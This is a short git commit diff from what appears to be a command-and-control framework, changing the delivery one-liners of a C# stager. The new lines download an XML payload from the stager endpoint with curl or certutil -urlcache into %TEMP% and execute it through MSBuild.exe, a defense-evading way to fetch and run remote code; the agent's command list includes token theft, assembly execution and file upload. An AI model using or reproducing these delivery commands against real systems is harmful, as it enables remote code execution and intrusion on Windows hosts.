3a98fe40b91623977f491677d8cc187c3d50d980
Skyler <Skyler.Knecht@outlook.com>
2022-06-23 01:50:53 -0400

    Edited the CERTUTIL deliveries

--- connect/server/stagers/csharp/agent.py
+++ connect/server/stagers/csharp/agent.py
@@ -8,7 +8,8 @@ csharp = Blueprint('csharp', __name__, template_folder='resources')
 endpoint = digit_identifier()
 csharp_endpoint = digit_identifier()
 artifact = string_identifier()
-delivery = f'curl ~endpoint~ -o {artifact}.xml && C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\MSBuild.exe {artifact}.xml'
+delivery = f'curl ~endpoint~ -o {artifact}.xml && C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\MSBuild.exe %TEMP%/{artifact}.xml\n' \
+           f'certutil -urlcache -split -f ~endpoint~ %TEMP%/{artifact}.xml && C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\MSBuild.exe %TEMP%/{artifact}.xml'
 commands = 'delay,whoami,hostname,os,pwd,cd,dir,make_token,rev2self,steal_token,get_token,cmd,ps,execute_assembly,download,upload,sleep'
 
 
